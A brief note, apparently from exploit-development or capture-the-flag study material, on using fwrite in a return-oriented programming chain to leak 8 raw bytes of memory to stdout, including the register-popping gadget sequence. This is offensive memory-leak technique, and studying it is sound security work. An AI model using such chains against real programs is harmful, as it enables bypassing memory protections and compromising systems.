# fwrite — the wider print path


fwrite(buf, 1, n, stdout) writes n raw bytes — a leak channel that
doesn't stop at NUL like puts does.

## The chain

    pop rdi ; the_addr
    pop rsi ; 1
    pop rdx ; 8
    pop rcx ; stdout
    fwrite@plt

x64's fourth arg is rcx — needs the rcx pop.
